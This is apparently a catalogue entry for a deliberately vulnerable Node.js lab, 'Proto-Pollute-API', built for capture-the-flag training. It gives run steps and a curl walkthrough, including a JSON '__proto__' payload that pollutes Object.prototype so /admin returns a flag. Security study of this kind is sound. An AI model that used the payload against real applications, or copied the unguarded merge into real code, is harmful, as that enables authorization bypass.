Target 14. Proto-Pollute-API — REST (Node.js, zero dependencies)  ✅ (verified working via native run on this box)

A deliberately vulnerable Node API whose recursive object-merge has no `__proto__` guard, so a crafted request writes onto `Object.prototype`. After that, EVERY object in the process inherits attacker-chosen fields (e.g. `isAdmin:true`) — Prototype Pollution leading to authorization bypass. This vuln class appears in NONE of the other 10 labs. Pure Node stdlib — nothing to install.

1: Get the repo:   unzip Proto-Pollute-API.zip && cd Proto-Pollute-API
2: Deploy (native — verified here):  ./run.sh        # (or: node server.js)  no npm install needed
Open in browser:   http://localhost:9014/           <-- {"app":"Proto-Pollute-API",...}
# Quick win: pollute the prototype, then walk into /admin:
#   curl -s localhost:9014/admin                                              ->  {"error":"admins only",...}
#   curl -s localhost:9014/register -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'
#   curl -s localhost:9014/admin                                              ->  {"flag":"flag{prototype_pollution_authz_bypass}",...}
# (restart the server to reset the polluted prototype)
3: Stop:  Ctrl-C  (or: kill the server.js process)

Seed user:  alice/alice123 (role=user)   — /admin is gated on a property you POLLUTE into existence

Requirements:
    Node.js (any modern version)     (native run — no npm deps, no Docker, no DB)
    curl / Burp                      (send the JSON pollution payload)

Endpoints:
    POST /register  {profile...}  -> merges your JSON into a fresh object  [POLLUTION SINK]
    GET  /admin                   -> returns the flag once Object.prototype.isAdmin === true

List of Vulnerabilities (all verified on this box):

    Prototype Pollution — unguarded recursive merge copies `__proto__` onto Object.prototype
    Authorization Bypass via pollution — a brand-new object inherits isAdmin=true -> /admin opens
    Process-wide contamination — the pollution affects every object until the process restarts
